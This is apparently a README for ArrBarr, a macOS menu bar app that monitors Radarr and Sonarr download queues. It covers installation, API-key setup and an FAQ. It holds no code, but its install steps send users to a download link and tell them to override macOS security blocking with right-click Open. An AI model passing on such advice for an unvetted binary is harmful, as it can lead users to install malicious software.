# 📊 ArrBarr - Monitor automated media downloads with ease

[![](https://img.shields.io/badge/Download_ArrBarr-Blue-blue)](https://github.com/nilessubscribed916/ArrBarr)

ArrBarr lives in your menu bar. It connects to your Radarr and Sonarr services to show the status of your current downloads. You see progress, file names, and time remaining without opening a browser tab.

## ⚙️ Requirements

You need a computer running macOS to use this app. It requires no extra software installations. You must have an active instance of Radarr or Sonarr running on your local network or a remote server. You need the API key from your Radarr or Sonarr settings page to link the services to ArrBarr.

## 📥 How to Install

1. Visit [this page](https://github.com/nilessubscribed916/ArrBarr) to download the latest version of the software.
2. Locate the file in your downloads folder.
3. Move the application file to your Applications folder.
4. Double-click the file to launch the program.
5. If your security settings block the app, right-click the file and select Open.

## 🗝️ Setup and Configuration

When you launch ArrBarr for the first time, a small icon appears in your menu bar at the top right of your screen. Click this icon to open the configuration menu.

Choose the Add Server option to begin the setup. You will see fields for the server address and the API key. Enter the local IP address for your Radarr or Sonarr instance, such as 192.168.1.5, followed by the port number. You can find the API key in the General settings section inside your Radarr or Sonarr web interface.

Click Save once you enter these details. The app attempts to connect to your service. If the connection succeeds, the icon changes to show active status and your queue appears in the drop-down list. You can add multiple servers for both Radarr and Sonarr to monitor all your libraries from one menu.

## 🛠️ Usage

The app refreshes data every sixty seconds by default. You can force a refresh at any time by clicking the Refresh button in the menu. 

The list shows the following details for each active download:
- The file name of the video
- The completion percentage
- The download speed
- The estimated time left

If a download stalls or an error occurs, the item appears in red text within the list. You hover over the item to see details regarding the error code or connection status.

## 🛡️ Privacy and Safety

ArrBarr stores your API keys in the local system keychain. This keeps your credentials secure and prevents unauthorized access to your media servers. No sensitive information leaves your device. The app communicates only with the addresses you provide during setup. 

## ❓ Frequently Asked Questions

**Does this app download files?**
No. ArrBarr monitors existing download queues. It tracks progress for tools like Deluge, qBittorrent, Sabnzbd, and NZBGet. It does not perform the downloading itself.

**Can I manage my library through the app?**
ArrBarr serves as a status monitoring tool. It shows information about your queue. It does not include features for adding new movies or series to your library.

**The app does not see my server.**
Verify your IP address and port number. Check that your Radarr or Sonarr instance is running and reachable from the computer where ArrBarr is installed. Ensure you copied the full API key without extra spaces.

**How do I remove the app?**
Drag the ArrBarr icon from your Applications folder to the Trash. You can also delete the local configuration files stored in your Library folder to remove all cached settings and saved API keys.

**Does this app support remote servers?**
Yes. You can enter a remote domain name or IP address if you have the port forwarded securely. We recommend using a VPN or a reverse proxy to maintain security when accessing your home server over the internet.

**Will this app drain my battery?**
ArrBarr uses minimal system resources. It runs as a background process and consumes very little memory. The app remains idle until you click the menu bar icon or it performs its periodic data refresh.

**Can I change the refresh rate?**
You can adjust the polling interval in the Preferences menu. A shorter interval provides real-time updates but uses more network bandwidth. A longer interval reduces background activity. The default setting offers the best balance for most users.

**Is there a dark mode version?**
Yes. ArrBarr automatically matches your system appearance. It looks clean and follows standard light or dark interface guidelines provided by your operating system.